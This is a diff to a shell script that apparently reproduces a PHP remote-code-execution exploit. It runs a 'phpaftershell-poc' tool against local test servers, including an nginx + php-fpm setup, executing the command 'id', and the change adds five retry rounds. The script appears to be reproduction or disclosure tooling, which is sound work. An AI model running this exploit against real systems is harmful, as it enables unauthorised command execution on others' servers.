@@ -26,9 +26,15 @@ curl -sf http://127.0.0.1:8087/ >/dev/null
 echo "== charge trace (diagnostic)"
 python3 -u poc/charge_trace.py 8087 | sed -n '1,6p'
 
-echo "== remote exploit (100% HTTP)"
-python3 -u ./phpaftershell-poc --target http://127.0.0.1:8087 \
-  --command 'id' --attempts 80
+echo "== remote exploit (100% HTTP) - independent rounds"
+for round in 1 2 3 4 5; do
+  echo "-- remote round $round"
+  if python3 -u ./phpaftershell-poc --target http://127.0.0.1:8087 \
+      --command 'id' --attempts 50; then
+    break
+  fi
+  [ "$round" = 5 ] && exit 1
+done
 
 echo "== cross-SAPI: same chain against nginx + php-fpm"
 python3 -u ./phpaftershell-poc --target http://127.0.0.1:8090 \
